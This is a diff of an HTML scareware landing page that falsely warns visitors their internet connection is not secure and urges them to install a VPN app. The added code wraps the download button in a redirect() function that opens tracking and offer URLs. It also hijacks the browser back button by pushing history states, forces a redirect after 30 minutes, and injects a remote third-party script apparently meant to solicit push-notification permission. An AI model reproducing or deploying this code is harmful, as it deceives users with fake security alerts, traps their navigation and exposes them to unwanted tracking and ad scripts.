@@ -8,10 +8,6 @@
 <meta name="googlebot" content="noindex">
 <title>No VPN Detected</title>
 <meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
-<script type="text/javascript" src="json" charset="UTF-8"></script><script async="" src="tfa.js" id="tb_tfa_script"></script><script async="" src="fbevents.js"></script><script src="app.js" type="text/javascript"></script>
-<script src="jquery-3.4.1.js" type="text/javascript"></script>
-<script src="common_h.js" type="text/javascript"></script>
-<link rel="icon" href="https://www.user-shield.com/internet-connection-not-secured/favicon.ico" type="image/x-icon">
 <style type="text/css">
         body {
             width: 100%;
@@ -72,7 +68,7 @@
 <body class="enterPage">
 <div class="main">
 <p style="text-align:center">
-<a href="https://app.appsflyer.com/id886492891?af_prt=takoomi&amp;pid=propellerads_int&amp;af_c_id=4720297&amp;af_siteid=47202974191674&amp;af_ad_id=10318926&amp;af_click_lookback=7d&amp;clickid=573312274144784923"><script type="text/javascript" style="display:none">
+<a onclick="redirect();"><script type="text/javascript" style="display:none">
 //<![CDATA[
 window.__mirage2 = {petok:"a5522f391c519d748277700aa7a5b466881bc6f7-1658251823-1800"};
 //]]>
@@ -80,12 +76,60 @@ window.__mirage2 = {petok:"a5522f391c519d748277700aa7a5b466881bc6f7-1658251823-1
 <script type="text/javascript" src="mirage2.min.js"></script>
 <img data-cfsrc="vpn.gif" src="vpn.gif"> </a>
 </p>
-<h4 style="text-align:center;color:red;" id="lang_title">Your Internet Connection May be Not Secure!</h4>
-<h3 style="font-size:16px;font-weight:bold;text-align: center;padding: 0 10px 0 10px" id="lang_desc">Install <b>VPN From the Appstore </b> and Protect Your Internet Connection!</h3>
+<h4 style="text-align:center;color:red;" id="lang_title">Your Internet Connection Not Secure!</h4>
+<h3 style="font-size:16px;font-weight:bold;text-align: center;padding: 0 10px 0 10px" id="lang_desc">Install <b>VPN From the Google Play </b> and Protect Your Internet Connection!</h3>
 <p style="text-align:left;color:#00a000; " id="lang_desc1">How to Protect Your Connection:</p>
-<p style="font-size:13px;text-align:left" id="lang_desc2"><strong>Step 1. </strong>Click on the Button “Download” Below and Install the Recommended Application from the Appstore</p>
-<p style="font-size:13px; text-align:left" id="lang_desc3"><strong>Step 2. </strong> Open the Installed Application and Start your Free Trial to Protect Your Internet Connection</p>
+<p style="font-size:13px;text-align:left" id="lang_desc2"><strong>Step 1. </strong>Click on the Button “Download” Below and Install the Recommended Application from the Google Play</p>
+<p style="font-size:13px; text-align:left" id="lang_desc3"><strong>Step 2. </strong> Open the Installed Application and Start your <b>Free Trial</b> to Protect Your Internet Connection</p>
 <br>
-<div id="but"><a id="lang_install" href="https://app.appsflyer.com/id886492891?af_prt=takoomi&amp;pid=propellerads_int&amp;af_c_id=4720297&amp;af_siteid=47202974191674&amp;af_ad_id=10318926&amp;af_click_lookback=7d&amp;clickid=573312274144784923">DOWNLOAD</a> </div>
+<div id="but"><a id="lang_install" onclick="redirect();">DOWNLOAD</a> </div>
 </div>
+
+<script type="text/javascript">
+    function redirect() {
+       window.open('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1');
+       setTimeout(function () {
+         window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2";
+       },  5000)
+     }
+    </script>
+    
+    <script type="text/javascript">
+    setTimeout(function () {
+      window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1";
+    }, 1800000);
+    </script>
+    
+    <script type="text/javascript">
+    ! function () {
+        var t;
+        try {
+            const URL = window.location.href.split(/[#]/)[0];
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
+            onpopstate = function(event){
+                event.state && location.replace('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1');
+            }
+        } catch (o) { console.log( o ); }
+    }();
+    </script>
+    
+    <script>
+    //org.rangextd.buzz
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//ouphouch.com/pfe/current/micro.tag.min.js?z=4947068'+'&ymid='+pci+'&sw=/sw-check-permissions-747a6.js';
+    s.onload = function(result) {
+      switch (result) {
+          case 'onPermissionDefault':break;
+          case 'onPermissionAllowed':break;
+          case 'onPermissionDenied':break;
+          case 'onAlreadySubscribed':break;
+          case 'onNotificationUnsupported':break;
+      }
+    }
+    
+    document.head.appendChild(s);
+    </script>
+
 </body></html>
